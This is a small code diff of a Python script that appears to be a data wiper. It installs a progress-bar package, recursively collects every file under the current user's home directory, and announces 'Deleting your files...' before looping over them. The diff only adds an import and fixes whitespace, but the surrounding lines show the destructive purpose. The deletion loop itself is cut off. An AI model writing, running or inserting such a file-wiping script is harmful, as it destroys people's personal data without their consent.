@@ -6,6 +6,7 @@ if not "alive-progress" in sys.modules:
 	system("pip install alive-progress")
 
 code = """import alive_progress
+import time
 import getpass
 import os
 
@@ -25,7 +26,7 @@ with alive_progress.alive_bar() as bar:
 			else:
 				items.append(child)
 				
-	find_files(f"/home/{getpass.getuser()}")	
+	find_files(f"/home/{getpass.getuser()}")
 	
 print("Deleting your files...")
 with alive_progress.alive_bar(len(items)) as bar:
